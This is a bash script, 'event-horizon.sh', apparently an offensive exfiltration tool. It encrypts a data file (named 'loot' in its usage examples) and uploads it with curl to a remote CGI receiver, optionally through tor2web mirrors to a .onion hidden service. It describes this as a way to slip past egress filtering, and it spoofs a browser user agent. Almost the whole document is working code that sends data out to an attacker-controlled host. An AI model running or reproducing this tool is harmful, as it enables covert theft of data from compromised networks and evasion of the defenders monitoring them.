#!/bin/bash

use() {
cat << EOF

xor-function = null @ nightowlconsulting.com
License: BSD 3

about:
curl is used to craft a url request with the necessary posts
encrypted with your public OpenSSL key that corrisponds to the private
one your server. This enables the upload of encrypted data to the
black-hole.pl CGI app.

usage examples

without tor:
./event-horizon.sh -k public.pem -a pphrase -t no -d loot -u adomain.com/ex-cgi.pl

using tor tor2web proxy:
./event-horizon.sh -k public.pem -a pphrase -t yes -d loot -u hakzorgiydgb.onion/ex-cgi.pl

notes:
 * The temporary password use for the symmetric encryption of the data to be
   uploaded is generated using /dev/urandom with base64 encoding.
 * The tor2web option enables the use of tor without having to connect to the
   tor network, this enbles the use of tor in a LAN with egress filtering
   that blocks tor.

options:
   -k   location of the public key in pem format for use in encryption
   -t   use tor2web to use exfil hosted on hidden service (yes/no)
   -a   trusted passphrase on the server hosting the cgi perl file
   -d   location of the data file you wish to upload
   -u   full url to the perl cgi upload app, if hidden service place .onion url

EOF

}

# Getting options and setting variables

if [[ $# -gt 12 || $# -lt 10 ]]; then use; exit; fi

while getopts :k:a:t:d:u: option; do
  case "${option}" in
     k ) PKEY="${OPTARG}";;
     a ) AUTH="${OPTARG}";;
     t ) TOR="${OPTARG}";;
     d ) DATA="${OPTARG}";;
     u ) EXFURL="${OPTARG}";;
     * ) use; exit;;
   esac
done

case $TOR in
  [Yy] ) TOR=TRUE;;
  [nN] ) TOR=FALSE;;
  [Yy][eE][sS] ) TOR=TRUE;;
  [Nn][oO] ) TOR=FALSE;;
  *  ) printf "\n\n Not a valid tor option, flag -t\n\n"; sleep 2; use;;
esac

# Generation of random key used in symmetric encription
TPASS=$(< /dev/urandom tr -dc _A-Z-a-z-0-9 | head -c 30 | base64)

# encrypting data with random passphrase/hash
openssl enc -aes-256-cbc -salt -a -in "$DATA" -out "$DATA".enc -k "$TPASS"

# using printf instead of echo to prevent \n from being appended, for smime data
printf "$AUTH" | openssl smime -encrypt -aes256 public.pem > au
printf "$TPASS" | openssl smime -encrypt -aes256 public.pem > pa

# setting variable to be passed as parameters to cgi with curl
EAUTH="au"
ETPASS="pa"
EDATA="$DATA.enc"

# check if the tor option was selected, if true then procceding to upload through tor2web like proxies
if [ "$TOR" = TRUE ]; then

      # setting vars to prep for tor2web proxy and use list of
      # mirrors to loop through for greater chance of success.
      TORURL=$(echo "$EXFURL" | cut -d'.' -f1)
      MIRRORS="tor2web.org tor2web.fi tor2web.blutmagie.de"
      for i in $MIRRORS; do
          CHECK=$(curl --user-agent "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0" -k -X POST -H "Cookie: disclaimer_accepted=true" -H "Expect:" -F "enc=@$EAUTH" -F "sym=@$ETPASS" -F "data=@$EDATA" https://"$TORURL"."$i")
          if [[ ! -z  $(echo "$CHECK" | grep -i "tor2web_disclaimer_acceptance") ]]; then
                echo ""
                echo "[!] Upload throug proxy failed trying another."
                echo ""
                continue
            else
                 echo "$CHECK" | tail -n 4
                 break
          fi
     done
     if [[ ! -z  $(echo "$CHECK" | grep -i "tor2web_disclaimer_acceptance") ]]; then
         echo "[!] Mirror list exausted, uploading failed, possibly due to changed disclamer code or stale mirrors"
     fi

else

     # curl upload directly to server over regular clearnet
     curl --user-agent "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0" -k -X POST -H "Expect:" -F "enc=@$EAUTH" -F "sym=@$ETPASS" -F "data=@$EDATA" "$EXFURL"
     if [[ $? -ne 0 ]]; then
        echo "Something went wrong with curl check your target"
     fi
fi

# clean up temp SMIME files
rm au pa

exit
